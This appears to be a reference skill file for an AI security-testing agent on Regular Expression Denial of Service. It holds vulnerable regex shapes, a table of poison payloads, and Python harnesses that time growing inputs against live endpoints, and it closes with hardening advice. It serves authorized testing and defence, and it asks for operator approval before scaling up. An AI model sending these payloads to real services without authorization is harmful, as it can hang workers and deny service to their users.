---
name: ReDoS
description: Reference for Regular Expression Denial of Service (catastrophic backtracking) covering vulnerable patterns, language-specific risk, payload construction, and timing oracles.
---

# ReDoS (Regex Denial of Service)

Reference for finding regex patterns that exhibit catastrophic backtracking on attacker-supplied input. Pull this in when an endpoint accepts arbitrary text that flows into validation, parsing, or template-engine regex evaluation, and you observe that response time scales non-linearly with input length.

> Black-box scope: probes drive HTTP and measure response time. The signal is super-linear time growth as a single payload is extended; confirmation is timing-driven.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Time-bound probes | `execute_curl --max-time` | Set explicit timeout to catch hangs. |
| Programmatic timing harness | `execute_code` | Send N requests with growing payload sizes, plot or compute t(N). |
| Local regex testing | `execute_code` | Validate that a candidate pattern actually backtracks on a known engine before pivoting to the live target. |

## The backtracking model

Regex engines fall into two classes:

| Class | Languages | Backtracking? |
|---|---|---|
| **Backtracking NFA** | Python `re`, JavaScript `RegExp`, Java `Pattern`, .NET `Regex`, Perl, Ruby, PHP `preg_*` | YES (vulnerable) |
| **Non-backtracking** | Go `regexp` (RE2), Rust `regex`, Linux `grep -E`, Hyperscan | NO (safe) |

Catastrophic backtracking happens when the engine tries every possible matching attempt for an input that fails near the end. The classic culprits:

| Pattern shape | Why it explodes |
|---|---|
| `(a+)+` | Two nested `+` quantifiers; engine tries all partitions |
| `(a*)*` | Same, with `*` |
| `(a|a)+` | Alternation overlap |
| `(a|aa)+` | Alternation overlap |
| `^(a+)+$` | Anchored variant -- forces full match |
| `(a+)+b` | Unanchored, hangs on `aaaa...aaa` (no `b`) |
| `(.*\.)*$` | Domain-style validators |
| `(<[^>]+>)+` | HTML-tag-like matchers |
| `(\.[a-z]+)+` | Email TLD-like |
| `^(\d+)+$` | Numeric input |
| `(\w+)*$` | Word characters with greedy/lazy mix |
| `(a{1,N})*` with large N | Bounded-quantifier nest |

The unifying property: **two or more nested quantifiers operating on overlapping alternatives**.

## Reconnaissance

### Identify regex consumption surfaces

| Surface | Likely regex consumer |
|---|---|
| Email field | `^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$` (often vulnerable) |
| URL field | `^https?://([\w.-]+)+...$` |
| Username allowlist | `^([a-zA-Z]+_?)+$` |
| Phone number | `^(\+?\d+)+$` |
| Markdown / BBCode parser | Many naive regexes |
| Search-with-wildcard | User-controlled regex passed to `re.match()` |
| Log parser | Server-side log-grouping regex |
| WAF rule input | Some WAFs use vulnerable regex internally |
| Template engine | Custom regex in directive parser |

### Stack fingerprint

| Hint | Engine | Risk |
|---|---|---|
| `Server: nginx` + Python app | Python `re` | High |
| Express / Next.js / NestJS | JS `RegExp` | High |
| Spring / Tomcat | Java `Pattern` | High |
| ASP.NET | .NET `Regex` | High |
| Ruby / Rails | Onigmo (Ruby) | High |
| Go (Echo / Gin / Fiber) | `regexp` (RE2) | **Low** (safe) |
| `grep -E`-style server-side | POSIX | **Low** |

If the server uses Go or any RE2-backed engine, ReDoS is a non-issue.

## Probe matrix

### Time-growth probe

```
execute_code language: python
import requests, time
TARGET = "https://target.tld/api/validate-email"
def probe(n):
    payload = "a" * n + "!"   # the trailing "!" forces full backtrack on (a+)+ patterns
    start = time.time()
    r = requests.post(TARGET, json={"email": payload}, timeout=15)
    return r.status_code, time.time() - start

for n in [10, 20, 30, 35, 38, 40]:
    print(n, probe(n))
```

If timings double or triple as `n` increments by 1-2, the pattern is super-linear (likely exponential).

### Pattern-specific payloads

| Suspected pattern | Payload to test |
|---|---|
| `^(a+)+$` | `aaaaaaaaaaaaaaaa!` (15-30 `a`s + bad char) |
| `(.*\.)+$` (domain validator) | `aaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaaa` (no TLD) |
| `^[A-Za-z]+@[A-Za-z]+\.[A-Za-z]+$` | `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@b` (35+ `a`s, missing dot/TLD) |
| `(\d+)+` | `1111111111111111111111111111111x` |
| `(<[^>]+>)+` | `<a><a><a><a><a><a><a><a><a><a><a><a><a` (unclosed tag explosion) |
| `(\w+)*$` | `aaaaaaaaaaaaaaaaaaaaaaaaaaa!` |

### Live target probe template

```
execute_code language: python
import requests, time, statistics
TARGET = "https://target.tld/api/register"
def fire(payload):
    s = time.time()
    r = requests.post(TARGET, json={"email": payload}, timeout=30)
    return time.time() - s

baseline = statistics.median([fire("a@b.com") for _ in range(3)])
print("baseline:", baseline)

# Growth experiment
for k in range(20, 45):
    pl = "a" * k + "@" + "a" * k
    t = fire(pl)
    print(k, t, "ratio", round(t / baseline, 2))
```

A linear `t(k)` is fine. An exponential `t(k)` (doubling per step) is the bug.

### Differential / timing oracles

Some servers strip the request after a worker timeout; the response comes back as `502 Bad Gateway` or `504 Gateway Timeout`. Treat any:

- 5xx response after >5 seconds with a small payload size
- Connection reset mid-response
- Different status codes for adjacent payload sizes (`38a -> 200`, `40a -> 502`)

as evidence of backtracking burning a worker.

### Resource-exhaustion vs targeted-DoS

ReDoS yields two classes of impact:

| Class | Description | Severity |
|---|---|---|
| Per-request hang | Single request consumes a worker for seconds | Medium / High (depending on rate-limiting) |
| Worker pool exhaustion | N parallel ReDoS requests = full app DoS | Critical |

Send a **small** burst (5-10 concurrent) to verify; do NOT scale up without operator approval.

## Fallbacks for missing tools

The brief flags `vuln-regex-detector` and `recheck` as missing. The agent runs equivalents via:

- `execute_code` Python harness (timing growth experiment above).
- Pure-Python "find me a regex that backtracks" via [`re-redos-checker`](https://pypi.org/project/redos-detector/) (pip-installable on demand) or by inspection.
- For static analysis on the target's own source (when operator-supplied), `/skill semgrep` with `p/javascript` / `p/python` packs.

If the target source is unavailable, behavioral timing is the only signal.

## Validation shape

A clean ReDoS finding includes:

1. The exact endpoint and parameter that consumes the regex.
2. The payload that triggers backtracking.
3. A timing curve (4-6 data points across input lengths) showing super-linear growth.
4. Confirmation the worker actually hangs (504 / 502 / connection close after timeout).
5. The regex (if known via leaked source / bundle) or a reasonable hypothesis ("looks like a domain-validator regex").
6. Per-request cost in seconds and an estimate of concurrent requests required to fill the worker pool.

## False positives

- Server uses Go / Rust / RE2 / Hyperscan -- engine is non-backtracking.
- Endpoint hits a different bottleneck (DB query, downstream API). Confirm the time scales with the regex input length specifically, not with general payload size.
- Server-side rate limit kicks in at low N and masks the growth curve.
- Linear time growth (proportional to length) is fine; only super-linear is exploitable.
- Endpoint times out at a fixed value (e.g. always 5 seconds) regardless of payload growth -- that is a downstream timeout, not ReDoS.

## Hardening summary

- Use a non-backtracking engine (RE2, Hyperscan) where possible.
- Cap input length before regex evaluation (`if len(input) > 256: reject`).
- Cap regex execution with a timeout (Python `regex` library's `timeout` arg, Java `setTimeout` on `Matcher`).
- Avoid nested quantifiers (`(a+)+`) and overlapping alternations (`(a|a)+`).
- Use anchored, deterministic patterns (`^[A-Za-z0-9._-]{1,64}@[A-Za-z0-9.-]{1,253}$` instead of an unbounded TLD validator).
- Validate by structural checks (RFC 5321 email parser) when correctness matters.
- Put expensive parsing behind authenticated endpoints + low rate limits.

## Hand-off

```
ReDoS confirmed on auth surface         -> built-in DoS attack-skill (with operator approval)
ReDoS via WAF rule input                 -> escalate; WAF DoS = downstream traffic blocked
ReDoS in template engine                 -> chain to /skill information_disclosure if errors leak
ReDoS via static analysis on source       -> /skill semgrep with p/javascript or p/python
```

## Pro tips

- The most reliable test is **growth ratio**, not absolute time. A request that goes from 0.1s to 1s to 8s as input grows by 5 chars per step is exponential. Single-shot timings can mislead.
- Anchored patterns (`^...$`) are usually slower under attack than unanchored.
- Trailing characters that cause the match to fail near the end (a non-matching final char like `!`) trigger maximal backtracking. `aaaaaa!` is the canonical poison suffix for `(a+)+$`.
- Email validators are the most common ReDoS source in the wild because the RFC 5321 grammar is too complex for naive regex; teams write a "good enough" validator and ship the bug.
- Many modern stdlib re-implementations switch to non-backtracking algorithms when the pattern fits a regular grammar. Test on the actual target stack version, not just a local Python REPL.
- Public ReDoS databases (CVE-2017-1000048 `ms`, CVE-2021-23358 `lodash`, CVE-2021-3795 `glob-parent`) are good starting points if you fingerprint a known dependency. Pivot to `/skill information_disclosure` to extract the dependency version first.
